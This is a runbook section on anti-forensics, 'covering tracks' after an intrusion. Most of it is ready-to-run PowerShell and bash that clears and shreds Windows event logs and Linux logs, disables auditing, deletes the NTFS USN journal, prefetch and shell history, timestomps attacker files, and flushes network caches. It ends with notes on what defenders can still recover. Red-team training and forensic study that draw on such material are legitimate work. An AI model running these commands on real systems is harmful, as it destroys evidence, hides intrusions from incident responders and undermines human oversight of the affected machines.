# Covering tracks

Removing or degrading artefacts that would allow incident responders
to reconstruct the operation. Effective anti-forensics is not about
deleting everything; it is about removing the specific artefacts that
link observed indicators to attacker actions.

Note: clearing logs during an active engagement is controversial. Removing
logs draws attention (a security tool monitoring for log gaps will alert)
and destroys evidence of defenders' own mistakes. The preferred approach
for most engagements is to avoid generating conspicuous artefacts rather
than removing them after the fact. This runbook covers both approaches.

## Windows: event log manipulation

```powershell
# clear all event logs (aggressive; will likely be noticed)
wevtutil el | ForEach-Object { wevtutil cl "$_" }

# targeted: clear only the Security log
Clear-EventLog -LogName Security

# selective: clear specific event IDs rather than the whole log
# (removes evidence of specific actions while leaving the log intact)
# requires scripting via the Windows Event Log API; no native cmdlet
```

```powershell
# audit policy: disable future logging of specific categories
auditpol /set /category:"Object Access" /success:disable /failure:disable
auditpol /set /category:"Account Logon" /success:disable /failure:disable
```

```powershell
# USN journal: NTFS file change records
# removing this destroys the record of file system changes
fsutil usn deletejournal /D C:
```

## Windows: prefetch and artefact removal

```powershell
# remove prefetch files (records of executables that ran)
Remove-Item C:\Windows\Prefetch\* -Force -ErrorAction SilentlyContinue

# remove Windows Error Reporting crash data
Remove-Item "$env:ProgramData\Microsoft\Windows\WER" -Recurse -Force `
  -ErrorAction SilentlyContinue

# remove RDP bitmap cache (reveals attacker desktop if left)
Remove-Item "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache\*" `
  -Force -ErrorAction SilentlyContinue

# remove recent files list
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue

# clean Disk Cleanup targets silently
cleanmgr /sagerun:65535
```

## Windows: PowerShell history

```powershell
# clear the current session's history
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()

# delete the saved history file
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue

# disable history saving for the current session
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

## Linux: log removal and sanitisation

```bash
# truncate (not delete) log files to avoid inode-change artefacts
> /var/log/auth.log
> /var/log/syslog
> /var/log/secure
> /var/log/messages

# remove systemd journal entries older than 1 second
journalctl --vacuum-time=1s

# physical destruction of log content (prevents recovery from unallocated space)
# use shred -u to overwrite and remove
find /var/log -type f -exec shred -n 3 -u {} \; 2>/dev/null

# remove bash history for all users
for f in /home/*/.bash_history /root/.bash_history; do
    shred -u "$f" 2>/dev/null
    ln -sf /dev/null "$f"
done
```

## Timestomping

Changing file timestamps to match legitimate files, preventing timeline
analysis from revealing when attacker tools were placed:

```powershell
# Windows: copy timestamps from a legitimate system file
$legitimate = Get-Item C:\Windows\System32\ntdll.dll
$target     = Get-Item C:\Temp\tool.exe

$target.CreationTime       = $legitimate.CreationTime
$target.LastWriteTime      = $legitimate.LastWriteTime
$target.LastAccessTime     = $legitimate.LastAccessTime
```

```bash
# Linux: inherit timestamps from a legitimate binary
touch -r /bin/bash ./malware.sh

# set specific timestamp
touch -d "2024-06-01 09:30:00" ./malware.sh
```

Note: timestomping affects the filesystem layer only. $MFT entries, USN
journal records, and prefetch data contain independent timestamps that
are unaffected. Competent forensic analysis will detect the inconsistency.

## Memory artefacts

Tools run in memory leave artefacts in RAM. Most are lost on reboot, but
memory forensics on a live system can recover them:

```powershell
# clear environment variables that contain credentials
[System.Environment]::SetEnvironmentVariable('AWS_ACCESS_KEY_ID', $null)
[System.Environment]::SetEnvironmentVariable('AWS_SECRET_ACCESS_KEY', $null)

# clear clipboard
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Clipboard]::Clear()
```

## Network artefacts

```bash
# Linux: clear ARP cache (removes recently contacted hosts)
ip neigh flush all

# clear DNS cache
systemd-resolve --flush-caches 2>/dev/null || nscd -i hosts 2>/dev/null

# remove SSH known_hosts entries added during operation
sed -i '/TARGET_IP/d' ~/.ssh/known_hosts
```

```powershell
# Windows: clear ARP and DNS caches
arp -d *
ipconfig /flushdns
```

## What defenders will still find

Despite thorough cleanup, resilient evidence sources remain:

- Cloud provider logs (AWS CloudTrail, Azure Activity Log) are tamper-resistant
  and often immutable
- EDR telemetry shipped to a remote server before cleanup cannot be removed
- SIEM logs that have already been forwarded cannot be deleted from the SIEM
- Network flow data at the perimeter is outside attacker control
- Volatile memory on a live system may contain traces unless fully rebooted

Treat cleanup as degrading the forensic record, not eliminating it.
Prioritise clean initial behaviour over post-hoc cleanup.
